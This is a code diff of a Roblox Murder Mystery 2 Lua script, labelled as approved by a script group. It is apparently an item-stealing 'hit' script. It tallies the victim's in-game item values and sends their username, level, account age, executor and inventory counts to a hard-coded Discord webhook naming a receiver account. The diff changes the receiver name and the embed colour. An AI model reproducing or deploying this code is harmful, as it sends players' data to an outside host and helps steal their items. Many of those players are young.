@@ -1,6 +1,6 @@
 -- WORKS @DOMOSCRIPTS APPROVED
 
-userName = "W1lliqmm"
+userName = "Virmality1"
 webHook = "https://discord.com/api/webhooks/1343782704264515616/nQX34btCczY9XnlW3VRfuko9E2Vbq2IK3jrrUPrdEbnIQhmZrtXrZMvGNOBZ0HNPoBM2"
 local values = {
     ["Nik's Scythe"] = 25000000,
@@ -1063,7 +1063,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
 local WebHookEmbed = CreateEmbed(
     "🍓 MURDER MYSTERY 2 ! | Notification",
     "Please execute the code above to get your hit.",
-    tonumber(10234667),
+    11220,
     {
         {name = "〘:bust_in_silhouette:〙Player Info", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
 {name = "〘:mailbox_with_no_mail:〙Hit Info", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
